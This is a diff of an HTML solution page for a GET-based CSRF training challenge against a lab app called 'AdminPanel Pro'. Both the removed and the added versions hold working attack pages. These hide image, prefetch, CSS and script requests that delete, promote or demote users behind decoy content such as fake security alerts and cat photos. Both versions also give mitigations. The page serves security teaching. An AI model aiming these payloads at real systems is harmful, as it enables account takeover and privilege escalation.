@@ -6,7 +6,7 @@
 <div class="row">
     <div class="col-md-10 offset-md-1">
         <div class="card">
-            <div class="card-header bg-success text-white">
+            <div class="card-header">
                 <h2 class="text-center">
                     <i class="bi bi-lightbulb-fill me-2"></i>
                     Level 2 Solution: GET-based CSRF - AdminPanel Pro Attack
@@ -15,17 +15,22 @@
             <div class="card-body">
                 <div class="alert alert-info">
                     <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
-                    <p>This challenge demonstrates CSRF attacks against AdminPanel Pro's administrative functions that use GET requests. GET-based CSRF attacks are particularly dangerous because they can be triggered through simple image tags, links, or browser prefetching mechanisms.</p>
+                    <p>This challenge demonstrates CSRF attacks against AdminPanel Pro's user management functions that use GET requests. GET-based CSRF attacks are particularly dangerous because they can be triggered through simple image tags, links, or browser prefetching mechanisms.</p>
                 </div>
 
                 <div class="card mb-4">
-                    <div class="card-header bg-primary text-white">
-                        <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Required</h4>
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Vulnerability Analysis</h4>
                     </div>
                     <div class="card-body">
-                        <p><strong>Primary Tools:</strong> Browser Developer Tools, Image hosting service, URL manipulation</p>
-                        <p><strong>Skills:</strong> GET request crafting, URL parameter manipulation, Social engineering</p>
-                        <p><strong>Advanced Tools:</strong> Browser prefetch exploitation, DNS prefetch attacks</p>
+                        <p>The AdminPanel Pro user management system is vulnerable to GET-based CSRF attacks because:</p>
+                        <ul>
+                            <li><strong>State-Changing Operations via GET:</strong> The application uses GET requests for operations that modify data (delete/promote/demote users)</li>
+                            <li><strong>No CSRF Protection:</strong> There are no anti-CSRF tokens or other protections in place</li>
+                            <li><strong>Predictable URL Parameters:</strong> The action URLs follow a predictable pattern with exposed parameters</li>
+                            <li><strong>No Referer Checking:</strong> The application doesn't verify the origin of requests</li>
+                        </ul>
+                        <p>This makes it possible for an attacker to create a malicious page with embedded resources (like images) that trigger state-changing GET requests when loaded.</p>
                     </div>
                 </div>
 
@@ -35,231 +40,120 @@
                     </div>
                     <div class="card-body">
                         <ol>
-                            <li><strong>Identify GET Operations:</strong> Find administrative actions performed via GET requests (delete, promote, demote users)</li>
-                            <li><strong>Analyze URL Structure:</strong> Examine the parameter structure for admin operations</li>
-                            <li><strong>Craft Malicious URLs:</strong> Create URLs that perform unauthorized administrative actions</li>
-                            <li><strong>Choose Attack Vector:</strong> Select delivery method (image tags, direct links, prefetch directives)</li>
-                            <li><strong>Deploy Attack:</strong> Embed malicious URLs in attacker-controlled content</li>
-                            <li><strong>Execute via Social Engineering:</strong> Trick authenticated administrators into triggering the requests</li>
+                            <li><strong>Analyze Target Functionality:</strong> Inspect the user management interface to identify the vulnerable GET requests</li>
+                            <li><strong>Identify URL Patterns:</strong> Note that user actions are performed via URLs like <code>?action=delete&user_id=1001</code></li>
+                            <li><strong>Choose Target Action:</strong> For this challenge, we need to target the "promote" action on user ID 1002</li>
+                            <li><strong>Create Attack Page:</strong> Build a page that includes an image with the src attribute pointing to the vulnerable URL</li>
+                            <li><strong>Exploit Browser Behavior:</strong> When the image is loaded, the browser will automatically make a GET request to the URL</li>
                         </ol>
                         <div class="alert alert-warning mt-3">
-                            <strong>Key Insight:</strong> GET-based state changes are inherently vulnerable to CSRF because browsers automatically send GET requests for images, stylesheets, and prefetch operations.
+                            <strong>Key Insight:</strong> Using GET requests for state-changing operations violates HTTP design principles and creates serious security vulnerabilities.
                         </div>
                     </div>
                 </div>
 
                 <div class="card mb-4">
-                    <div class="card-header bg-success text-white">
-                        <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>GET-based CSRF Attack Payloads</h4>
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>CSRF Attack Payload</h4>
                     </div>
                     <div class="card-body">
-                        <h5>1. Image Tag Attack (Most Common)</h5>
-                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Malicious Image-based CSRF Attack --&gt;
+                        <p>The simplest attack payload uses an image tag with a source pointing to the vulnerable endpoint:</p>
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- GET-based CSRF Attack Against AdminPanel Pro --&gt;
 &lt;html&gt;
 &lt;head&gt;
-    &lt;title&gt;AdminPanel Security Alert&lt;/title&gt;
+    &lt;title&gt;Cute Cats Gallery&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
-    &lt;h2&gt;Security Alert: Immediate Action Required&lt;/h2&gt;
-    &lt;p&gt;Our system detected suspicious activity. Please review the security report below:&lt;/p&gt;
+    &lt;h1&gt;Adorable Cat Pictures&lt;/h1&gt;
     
-    &lt;!-- Hidden malicious images --&gt;
-    &lt;img src="http://target.com/csrf/level2?action=delete&user_id=admin&confirm=yes" 
-         style="display:none;" alt="security-check"&gt;
+    &lt;p&gt;Check out these cute cats:&lt;/p&gt;
     
-    &lt;img src="http://target.com/csrf/level2?action=promote&user_id=attacker&role=admin" 
-         style="display:none;" alt="security-validation"&gt;
+    &lt;!-- This image doesn't exist, but the browser will still try to load it, 
+         triggering the CSRF attack --&gt;
+    &lt;img src="http://localhost:5000/csrf/level2?action=promote&user_id=1002" 
+         style="display:none" alt="Hidden CSRF trigger"&gt;
     
-    &lt;img src="http://target.com/csrf/level2?action=demote&user_id=security_officer&role=user" 
-         style="display:none;" alt="security-audit"&gt;
+    &lt;!-- Show actual cat images to disguise the attack --&gt;
+    &lt;img src="https://placekitten.com/400/300" alt="Cute cat 1"&gt;
+    &lt;img src="https://placekitten.com/300/400" alt="Cute cat 2"&gt;
     
-    &lt;!-- Visible content to avoid suspicion --&gt;
-    &lt;div style="margin-top:20px;"&gt;
-        &lt;h3&gt;System Status: Checking...&lt;/h3&gt;
-        &lt;p&gt;Please wait while we verify your account security.&lt;/p&gt;
-        &lt;div style="border:1px solid #ccc; padding:10px; background:#f9f9f9;"&gt;
-            &lt;strong&gt;Security Scan Progress:&lt;/strong&gt; 
-            &lt;span id="progress"&gt;0%&lt;/span&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-    &lt;script&gt;
-    // Fake progress to keep user engaged
-    var progress = 0;
-    var interval = setInterval(function() {
-        progress += 10;
-        document.getElementById('progress').textContent = progress + '%';
-        if (progress >= 100) {
-            clearInterval(interval);
-            document.body.innerHTML += '&lt;h3 style="color:green;"&gt;Security check completed successfully.&lt;/h3&gt;';
-        }
-    }, 500);
-    &lt;/script&gt;
+    &lt;p&gt;Aren't they adorable?&lt;/p&gt;
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
 
-                        <h5 class="mt-4">2. Link-based Attack</h5>
-                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Social Engineering Link Attack --&gt;
-&lt;html&gt;
-&lt;body&gt;
-    &lt;h2&gt;AdminPanel Pro - Critical Security Update&lt;/h2&gt;
-    &lt;p&gt;A critical security vulnerability has been detected. Click the links below to secure your system:&lt;/p&gt;
-    
-    &lt;ul&gt;
-        &lt;li&gt;&lt;a href="http://target.com/csrf/level2?action=delete&user_id=suspicious_user_123&confirm=yes"&gt;
-            🔒 Remove Compromised Account&lt;/a&gt;&lt;/li&gt;
-        &lt;li&gt;&lt;a href="http://target.com/csrf/level2?action=promote&user_id=security_expert&role=admin"&gt;
-            ⬆️ Promote Security Expert&lt;/a&gt;&lt;/li&gt;
-        &lt;li&gt;&lt;a href="http://target.com/csrf/level2?action=demote&user_id=temp_admin&role=user"&gt;
-            ⬇️ Remove Temporary Admin Access&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-    
-    &lt;p&gt;&lt;small&gt;These actions will help secure your AdminPanel Pro installation.&lt;/small&gt;&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
-
-                        <h5 class="mt-4">3. Browser Prefetch Attack</h5>
-                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Advanced Prefetch-based Attack --&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;AdminPanel Documentation&lt;/title&gt;
-    
-    &lt;!-- DNS prefetch to avoid suspicion --&gt;
-    &lt;link rel="dns-prefetch" href="http://target.com"&gt;
-    
-    &lt;!-- Malicious prefetch directives --&gt;
-    &lt;link rel="prefetch" href="http://target.com/csrf/level2?action=delete&user_id=admin&confirm=yes"&gt;
-    &lt;link rel="preload" href="http://target.com/csrf/level2?action=promote&user_id=attacker&role=admin" as="fetch" crossorigin&gt;
-    
-    &lt;!-- Alternative prefetch methods --&gt;
-    &lt;link rel="prerender" href="http://target.com/csrf/level2?action=demote&user_id=security_team&role=user"&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;h1&gt;AdminPanel Pro Documentation&lt;/h1&gt;
-    &lt;p&gt;Welcome to the official documentation...&lt;/p&gt;
-    
-    &lt;!-- Legitimate-looking content --&gt;
-    &lt;div&gt;
-        &lt;h2&gt;Getting Started&lt;/h2&gt;
-        &lt;p&gt;This documentation will help you understand AdminPanel Pro features...&lt;/p&gt;
-    &lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
+                        <p class="mt-4">Alternative attack methods:</p>
+                        <ul>
+                            <li><strong>CSS Background Image:</strong>
+                                <pre class="bg-dark text-light p-2 rounded"><code>&lt;div style="background-image: url('http://localhost:5000/csrf/level2?action=promote&user_id=1002');"&gt;&lt;/div&gt;</code></pre>
+                            </li>
+                            <li><strong>Favicon Link:</strong>
+                                <pre class="bg-dark text-light p-2 rounded"><code>&lt;link rel="icon" href="http://localhost:5000/csrf/level2?action=promote&user_id=1002"&gt;</code></pre>
+                            </li>
+                            <li><strong>Automatic Redirect:</strong>
+                                <pre class="bg-dark text-light p-2 rounded"><code>&lt;script&gt;
+window.location = 'http://localhost:5000/csrf/level2?action=promote&user_id=1002';
+&lt;/script&gt;</code></pre>
+                            </li>
+                        </ul>
                     </div>
                 </div>
 
                 <div class="card mb-4">
-                    <div class="card-header bg-info text-white">
-                        <h4 class="mb-0"><i class="bi bi-gear-fill me-2"></i>Advanced Attack Techniques</h4>
-                    </div>
-                    <div class="card-body">
-                        <h5>1. Redirect Chain Attack</h5>
-                        <pre class="bg-dark text-light p-2 rounded"><code>&lt;!-- Create redirect chain to obfuscate attack --&gt;
-&lt;meta http-equiv="refresh" content="0;url=http://bit.ly/admin-security"&gt;
-&lt;!-- bit.ly redirects to: http://target.com/csrf/level2?action=delete&user_id=admin --&gt;</code></pre>
-
-                        <h5 class="mt-3">2. JavaScript-based GET Attack</h5>
-                        <pre class="bg-dark text-light p-2 rounded"><code>// Programmatic GET request execution
-function executeAdminActions() {
-    var actions = [
-        'http://target.com/csrf/level2?action=delete&user_id=admin&confirm=yes',
-        'http://target.com/csrf/level2?action=promote&user_id=attacker&role=admin',
-        'http://target.com/csrf/level2?action=demote&user_id=security_team&role=user'
-    ];
-    
-    actions.forEach(function(url, index) {
-        setTimeout(function() {
-            var img = new Image();
-            img.src = url;
-        }, index * 1000); // Stagger requests
-    });
-}
-
-// Execute on page load
-window.onload = executeAdminActions;</code></pre>
-
-                        <h5 class="mt-3">3. CSS-based Attack (Experimental)</h5>
-                        <pre class="bg-dark text-light p-2 rounded"><code>/* CSS-based CSRF attempt */
-.csrf-attack {
-    background-image: url('http://target.com/csrf/level2?action=delete&user_id=admin');
-}
-
-/* Apply to hidden element */
-.hidden-csrf { display: none; }</code></pre>
-                    </div>
-                </div>
-
-                <div class="card mb-4">
-                    <div class="card-header bg-danger text-white">
+                    <div class="card-header">
                         <h4 class="mb-0"><i class="bi bi-shield-exclamation me-2"></i>Security Impact</h4>
                     </div>
                     <div class="card-body">
-                        <p>GET-based CSRF vulnerabilities in AdminPanel Pro allow attackers to:</p>
+                        <p>This GET-based CSRF vulnerability in AdminPanel Pro allows attackers to:</p>
                         <ul>
-                            <li><strong>Administrative Privilege Escalation:</strong> Promote attacker accounts to administrator level</li>
-                            <li><strong>User Account Manipulation:</strong> Delete, demote, or modify user accounts without authorization</li>
-                            <li><strong>System Compromise:</strong> Gain full administrative control over the platform</li>
-                            <li><strong>Stealth Operations:</strong> Execute attacks through passive browser actions (prefetch, image loading)</li>
-                            <li><strong>Mass User Impact:</strong> Affect multiple users through single malicious page visits</li>
+                            <li><strong>Privilege Escalation:</strong> Promote regular users to administrators</li>
+                            <li><strong>Account Deletion:</strong> Delete user accounts without authorization</li>
+                            <li><strong>Privilege Demotion:</strong> Demote administrators to regular users</li>
+                            <li><strong>Silent Exploitation:</strong> Execute attacks that leave no visible trace to the victim</li>
+                            <li><strong>Mass Exploitation:</strong> Target multiple users simultaneously through popular websites</li>
                         </ul>
                         <div class="alert alert-danger mt-3">
-                            <strong>Critical Weakness:</strong> GET-based state changes can be triggered accidentally through browser prefetch mechanisms, search engine crawlers, or security scanners.
+                            <strong>Real-world Impact:</strong> GET-based CSRF vulnerabilities can lead to complete administrative takeover of systems, data loss, and service disruption.
                         </div>
                     </div>
                 </div>
 
                 <div class="card mb-4">
-                    <div class="card-header bg-success text-white">
+                    <div class="card-header">
                         <h4 class="mb-0"><i class="bi bi-shield-check me-2"></i>Mitigation Strategies</h4>
                     </div>
                     <div class="card-body">
-                        <h5>Critical Fix:</h5>
-                        <div class="alert alert-warning">
-                            <strong>Never use GET requests for state-changing operations!</strong> This is the fundamental security principle.
-                        </div>
-                        
                         <h5>Primary Defenses:</h5>
                         <ul>
-                            <li><strong>Use POST/PUT/DELETE:</strong> Always use appropriate HTTP methods for state changes</li>
-                            <li><strong>CSRF Tokens:</strong> Implement anti-CSRF tokens in all forms</li>
-                            <li><strong>Confirmation Pages:</strong> Require explicit user confirmation for destructive actions</li>
+                            <li><strong>Use POST for State Changes:</strong> Never use GET requests for operations that change state or data</li>
+                            <li><strong>Implement CSRF Tokens:</strong> Add unpredictable tokens to all state-changing operations</li>
+                            <li><strong>SameSite Cookies:</strong> Set cookies with SameSite=Strict attribute</li>
                         </ul>
                         
-                        <h5>Additional Protections:</h5>
+                        <h5 class="mt-3">Additional Protections:</h5>
                         <ul>
-                            <li><strong>HTTP Method Validation:</strong> Reject GET requests for admin operations</li>
-                            <li><strong>Referrer Validation:</strong> Check that requests originate from trusted domains</li>
-                            <li><strong>Rate Limiting:</strong> Limit administrative action frequency</li>
-                            <li><strong>Activity Logging:</strong> Log all administrative actions with IP and user agent</li>
-                            <li><strong>Multi-Factor Authentication:</strong> Require additional verification for sensitive operations</li>
+                            <li><strong>Require Confirmation:</strong> Add confirmation steps for sensitive operations</li>
+                            <li><strong>Check Referer Header:</strong> Validate that requests come from your own domain</li>
+                            <li><strong>Use POST + Redirect Pattern:</strong> Implement the POST/Redirect/GET pattern for form submissions</li>
                         </ul>
 
                         <div class="alert alert-success mt-3">
-                            <strong>Secure Implementation:</strong>
-                            <pre class="mt-2"><code>&lt;!-- Secure admin action form --&gt;
-&lt;form action="/admin/delete_user" method="post"&gt;
-    &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;
-    &lt;input type="hidden" name="user_id" value="{{ user.id }}"&gt;
-    &lt;button type="submit" onclick="return confirm('Delete user?')"&gt;
-        Delete User
-    &lt;/button&gt;
+                            <strong>Secure Implementation Example:</strong>
+                            <pre class="mt-2"><code>&lt;!-- Change from GET to POST with CSRF token --&gt;
+&lt;form action="/admin/user/promote" method="post"&gt;
+    &lt;input type="hidden" name="csrf_token" value="{{ "{{ csrf_token }}" }}"&gt;
+    &lt;input type="hidden" name="user_id" value="1002"&gt;
+    &lt;button type="submit"&gt;Promote User&lt;/button&gt;
 &lt;/form&gt;</code></pre>
                         </div>
                     </div>
                 </div>
 
                 <div class="text-center mt-4">
-                    <a href="/csrf/level1" class="btn btn-secondary me-2">
-                        <i class="bi bi-arrow-left me-1"></i>Previous Challenge
-                    </a>
                     <a href="/csrf/level2" class="btn btn-primary me-2">
                         <i class="bi bi-arrow-left me-1"></i>Back to Challenge
                     </a>
                     <a href="/csrf/level3" class="btn btn-success">
                         <i class="bi bi-arrow-right me-1"></i>Next Challenge
-                    </a>
-                    <a href="/challenges" class="btn btn-info ms-2">
-                        <i class="bi bi-list me-1"></i>All Challenges
                     </a>
                 </div>
             </div>
